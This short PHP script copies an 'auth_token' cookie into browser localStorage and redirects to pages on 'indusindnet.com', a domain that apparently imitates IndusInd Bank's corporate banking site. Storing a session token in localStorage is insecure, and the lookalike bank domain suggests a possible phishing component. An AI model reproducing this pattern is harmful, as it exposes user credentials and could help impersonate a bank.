<?php
//   header('location: ./user');
if (isset($_COOKIE["auth_token"])) {
    $authToken = $_COOKIE["auth_token"];

    
    echo '<script>';
    echo 'var dataFromPHP = ' . json_encode($authToken) . ';';
    echo 'localStorage.setItem("myData", JSON.stringify(dataFromPHP));';
    echo "window.open('https://indusind.indusindnet.com/user/', '_self')";
    echo '</script>';

    
} else {
    header("Location: https://indusindbank.indusindnet.com/corp/BANKAWAY.php");
    // exit();
}
?>